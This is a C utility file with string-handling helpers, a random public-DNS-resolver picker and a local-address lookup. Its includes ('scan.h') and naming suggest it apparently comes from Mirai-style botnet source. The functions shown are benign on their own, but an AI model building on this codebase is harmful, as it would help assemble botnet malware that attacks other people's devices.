#define _GNU_SOURCE

#include <stdint.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

#include "headers/includes.h"
#include "headers/rand.h"
#include "headers/scan.h"

int util_strlen(char *str)
{
    int num = 0;

    while(*str++ != 0)
    	num++;

    return num;
}

void util_memcpy(void *dst, void *src, int len)
{
    char *ptr_dst = (char *)dst;
    char *ptr_src = (char *)src;

    while(len--)
        *ptr_dst++ = *ptr_src++;
}

void util_null(void *buf, char ch, int len)
{
    char *ptr = buf;

    while(len--)
        *ptr++ = ch;
}

void util_strcpy(char *dst, char *src)
{
    int len = util_strlen(src);
    util_memcpy(dst, src, len + 1);
    return;
}

void util_strcat(char *dst, char *src)
{
    while(*dst) dst++;
    while(*dst++ = *src++);    
    return;
}

// Baidu/Google/OpenDNS/Cloudflare
uint32_t get_random_dns_resolver(void)
{
    switch(rand_new() % 10)
    {
        case 0:
            return INET_ADDR(8,8,8,8);
        case 1:
            return INET_ADDR(8,8,4,4);
        case 2:
            return INET_ADDR(208,67,222,222);
        case 3:
            return INET_ADDR(208,67,220,220);
        case 4:
            return INET_ADDR(180,76,76,76);
        case 5:
            return INET_ADDR(114,114,114,114);
        case 6:
            return INET_ADDR(1,1,1,1);
        case 7:
            return INET_ADDR(1,0,0,1);
        case 8:
            return INET_ADDR(114,114,115,115);
        case 9:
            return INET_ADDR(1,2,4,8);
    }
}

uint32_t util_get_local_addr(void)
{
    struct sockaddr_in addr;
    socklen_t addr_len = 0;
    int fd = -1;

    if((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        return 0;

    addr.sin_family = AF_INET;
    //addr.sin_addr.s_addr = get_random_dns_resolver();
    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
    addr.sin_port = htons(53);

    connect(fd, (struct sockaddr_in *)&addr, sizeof(addr));

    addr_len = sizeof(addr);
    getsockname(fd, (struct sockaddr *)&addr, &addr_len);

    close(fd);
    return addr.sin_addr.s_addr;
}

BOOL util_strcmp(char *src, char *dst)
{
    int len = util_strlen(src);
    int len2 = util_strlen(dst);

    // If the source & destination length do not match fail
    if(len != len2)
        return FALSE;

    while(len--)
    {
        if(*src++ != *dst++)
            return FALSE;
    }

    return TRUE;
}
